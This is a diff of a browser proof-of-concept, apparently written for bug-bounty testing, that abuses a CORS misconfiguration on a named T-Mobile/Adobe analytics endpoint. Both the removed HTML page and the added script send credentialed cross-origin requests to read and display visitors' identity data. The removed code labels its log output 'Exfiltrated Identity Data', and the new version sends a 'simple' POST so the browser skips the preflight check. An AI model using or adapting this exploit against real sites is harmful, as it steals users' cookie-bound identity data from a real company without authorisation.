@@ -1,25 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head><title>CORS Impact Test</title></head>
-<body>
-    <h2>T-Mobile Identity Leak Test</h2>
-    <p>If successful, your unique Identity IDs will appear below:</p>
-    <pre id="output">Waiting for data...</pre>
-
-    <script>
-        fetch('https://smetrics.t-mobile.com/ee/or2/v1/identity/acquire', {
-            method: 'GET',
-            credentials: 'include' // This attempts to send T-Mobile/Adobe cookies
-        })
-        .then(response => response.json())
-        .then(data => {
-            // This is the "Missing Data" they want to see
-            document.getElementById('output').innerText = JSON.stringify(data, null, 2);
-            console.log("Exfiltrated Identity Data:", data);
-        })
-        .catch(err => {
-            document.getElementById('output').innerText = "Error: " + err;
-        });
-    </script>
-</body>
-</html>
+// This version avoids the "Preflight" to try and get a response
+fetch('https://smetrics.t-mobile.com/ee/or2/v1/identity/acquire', {
+    method: 'POST', // Try POST first, it's common for Adobe Identity
+    mode: 'cors',   // We WANT cors mode so we can read the data
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded' // "Simple" content type
+    },
+    body: 'config={}' // Some Adobe endpoints expect a body like this
+})
+.then(response => {
+    // If this works, we'll see the Origin in the log
+    console.log("Success! Allowed Origin:", response.headers.get('Access-Control-Allow-Origin'));
+    return response.json();
+})
+.then(data => {
+    document.getElementById('output').innerText = JSON.stringify(data, null, 2);
+})
+.catch(err => {
+    document.getElementById('output').innerText = "Blocked by Browser Security: " + err + 
+    "\n\nTip: Check the Network Tab (F12) to see if Access-Control-Allow-Origin is present but wrong.";
+});
